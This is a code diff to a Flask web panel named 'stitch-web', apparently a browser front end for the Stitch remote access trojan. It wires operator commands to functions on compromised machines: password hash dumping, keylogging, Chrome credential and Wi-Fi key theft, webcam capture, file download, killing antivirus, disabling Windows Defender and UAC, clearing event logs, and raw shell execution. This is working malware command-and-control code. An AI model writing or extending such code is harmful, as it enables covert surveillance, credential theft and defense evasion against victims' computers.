@@ -381,6 +381,11 @@ def ratelimit_handler(e):
 # ============================================================================
 # Routes - Authentication
 # ============================================================================
+@app.route('/health')
+def health():
+    """Health check endpoint for deployment"""
+    return jsonify({'status': 'healthy', 'service': 'stitch-web'}), 200
+
 @app.route('/')
 @login_required
 def index():
@@ -811,7 +816,11 @@ def execute_real_command(command, conn_id=None):
         return f"❌ Error executing command: {str(e)}"
 
 def execute_on_target(socket_conn, command, aes_key, target_ip):
-    """Execute command on target machine using real Stitch protocol"""
+    """Execute command on target machine using proper Stitch architecture"""
+    import io
+    import sys
+    from contextlib import redirect_stdout
+    
     try:
         # Get target info from config
         import configparser
@@ -820,12 +829,23 @@ def execute_on_target(socket_conn, command, aes_key, target_ip):
         
         if target_ip in config.sections():
             target_os = config.get(target_ip, 'os') if config.has_option(target_ip, 'os') else 'Unknown'
+            target_platform = config.get(target_ip, 'os') if config.has_option(target_ip, 'os') else 'Unknown'
             target_hostname = config.get(target_ip, 'hostname') if config.has_option(target_ip, 'hostname') else target_ip
             target_user = config.get(target_ip, 'user') if config.has_option(target_ip, 'user') else 'Unknown'
+            target_port = config.get(target_ip, 'port') if config.has_option(target_ip, 'port') else '80'
         else:
-            target_os = 'Unknown'
-            target_hostname = target_ip
-            target_user = 'Unknown'
+            return f"❌ Target {target_ip} not found in connection history. Please reconnect."
+        
+        # Get downloads path for this target
+        cli_dwld = os.path.join(downloads_path, target_ip)
+        if not os.path.exists(cli_dwld):
+            os.makedirs(cli_dwld, exist_ok=True)
+        
+        # Set temp path based on OS
+        if target_os.startswith('win'):
+            cli_temp = 'C:\\Windows\\Temp\\'
+        else:
+            cli_temp = '/tmp/'
         
         output_header = f"""🎯 Target: {target_hostname} ({target_ip})
 👤 User: {target_user}
@@ -833,31 +853,150 @@ def execute_on_target(socket_conn, command, aes_key, target_ip):
 ⚡ Command: {command}
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-OUTPUT:
 """
         
-        # Send command to target using Stitch protocol
         try:
-            # Use stitch_lib functions for encrypted communication
-            stitch_lib.st_send(socket_conn, command.encode('utf-8'), aes_key)
+            # Create stitch_commands_library instance
+            stlib = stitch_lib.stitch_commands_library(
+                socket_conn,
+                target_ip,
+                target_port,
+                aes_key,
+                target_os,
+                target_platform,
+                target_hostname,
+                target_user,
+                cli_dwld,
+                cli_temp
+            )
             
-            # Receive response from target
-            response = stitch_lib.st_receive(socket_conn, aes_key, as_string=True)
+            # Parse command
+            cmd_parts = command.strip().split(maxsplit=1)
+            cmd_name = cmd_parts[0].lower() if cmd_parts else ''
+            cmd_args = cmd_parts[1] if len(cmd_parts) > 1 else ''
             
-            if response:
-                return output_header + response
+            # Capture output from st_print calls
+            output_buffer = io.StringIO()
+            
+            # Route command to appropriate method
+            result = None
+            with redirect_stdout(output_buffer):
+                if cmd_name == 'sysinfo':
+                    stlib.sysinfo()
+                elif cmd_name == 'screenshot':
+                    stlib.screenshot()
+                elif cmd_name == 'hashdump':
+                    stlib.hashdump()
+                elif cmd_name == 'keylogger':
+                    if cmd_args.startswith('start'):
+                        stlib.keylogger('start')
+                    elif cmd_args.startswith('stop'):
+                        stlib.keylogger('stop')
+                    elif cmd_args.startswith('dump'):
+                        stlib.keylogger('dump')
+                    elif cmd_args.startswith('status'):
+                        stlib.keylogger('status')
+                    else:
+                        return output_header + "❌ Keylogger requires: start/stop/dump/status"
+                elif cmd_name == 'avscan':
+                    stlib.avscan()
+                elif cmd_name == 'avkill':
+                    stlib.avkill()
+                elif cmd_name == 'chromedump':
+                    stlib.chromedump()
+                elif cmd_name == 'wifikeys':
+                    stlib.wifikeys()
+                elif cmd_name == 'freeze':
+                    stlib.freeze(cmd_args)
+                elif cmd_name == 'webcamlist':
+                    stlib.webcamlist()
+                elif cmd_name == 'webcamsnap':
+                    if cmd_args:
+                        stlib.webcamsnap(cmd_args)
+                    else:
+                        return output_header + "❌ Webcamsnap requires device parameter"
+                elif cmd_name == 'displayoff':
+                    stlib.displayoff()
+                elif cmd_name == 'displayon':
+                    stlib.displayon()
+                elif cmd_name == 'lockscreen':
+                    stlib.lockscreen()
+                elif cmd_name == 'popup':
+                    stlib.popup()
+                elif cmd_name == 'logintext':
+                    stlib.logintext()
+                elif cmd_name == 'clearev':
+                    stlib.clearev()
+                elif cmd_name == 'disableuac':
+                    stlib.disableUAC()
+                elif cmd_name == 'enableuac':
+                    stlib.enableUAC()
+                elif cmd_name == 'disablerdp':
+                    stlib.disableRDP()
+                elif cmd_name == 'enablerdp':
+                    stlib.enableRDP()
+                elif cmd_name == 'disablewindef':
+                    stlib.disableWindef()
+                elif cmd_name == 'enablewindef':
+                    stlib.enableWindef()
+                elif cmd_name == 'environment':
+                    stlib.environment()
+                elif cmd_name == 'ps':
+                    stlib.ps(cmd_args)
+                elif cmd_name == 'pwd':
+                    stlib.pwd()
+                elif cmd_name == 'ls':
+                    stlib.ls(cmd_args)
+                elif cmd_name == 'location':
+                    stlib.location()
+                elif cmd_name == 'vmscan':
+                    stlib.vmscan()
+                elif cmd_name == 'ipconfig' or cmd_name == 'ifconfig':
+                    stlib.ifconfig(cmd_args)
+                elif cmd_name == 'drives':
+                    stlib.drives()
+                elif cmd_name == 'lsmod':
+                    stlib.lsmod(cmd_args)
+                elif cmd_name == 'download':
+                    if cmd_args:
+                        stlib.download(cmd_args)
+                    else:
+                        return output_header + "❌ Download requires file path parameter"
+                elif cmd_name == 'cat':
+                    if cmd_args:
+                        stlib.cat(cmd_args)
+                    else:
+                        return output_header + "❌ Cat requires file path parameter"
+                elif cmd_name == 'cd':
+                    if cmd_args:
+                        stlib.cd(cmd_args)
+                    else:
+                        return output_header + "❌ CD requires directory parameter"
+                else:
+                    # For unrecognized commands, send as shell command
+                    stlib.send(command)
+                    result = stlib.receive()
+            
+            # Get captured output
+            captured = output_buffer.getvalue()
+            if captured:
+                return output_header + captured
+            elif result:
+                return output_header + result
             else:
-                return output_header + "⚠️ No output returned from target (command may still have executed)"
+                return output_header + "✅ Command executed (check logs for output)"
                 
+        except AttributeError as e:
+            return output_header + f"❌ Command '{cmd_name}' not supported or requires parameters\n\nError: {str(e)}"
         except socket.timeout:
             return output_header + "⚠️ Command timed out - target may be slow or command is still executing"
         except socket.error as e:
             return output_header + f"❌ Connection error: {str(e)}\n\nTarget may have disconnected."
         except Exception as e:
-            return output_header + f"❌ Execution error: {str(e)}"
+            return output_header + f"❌ Execution error: {str(e)}\n\nFull error: {type(e).__name__}"
         
     except Exception as e:
-        return f"❌ Error communicating with target: {str(e)}"
+        return f"❌ Error setting up command execution: {str(e)}"
 
 def get_connection_aes_key(target_ip):
     """Get AES key for connection"""
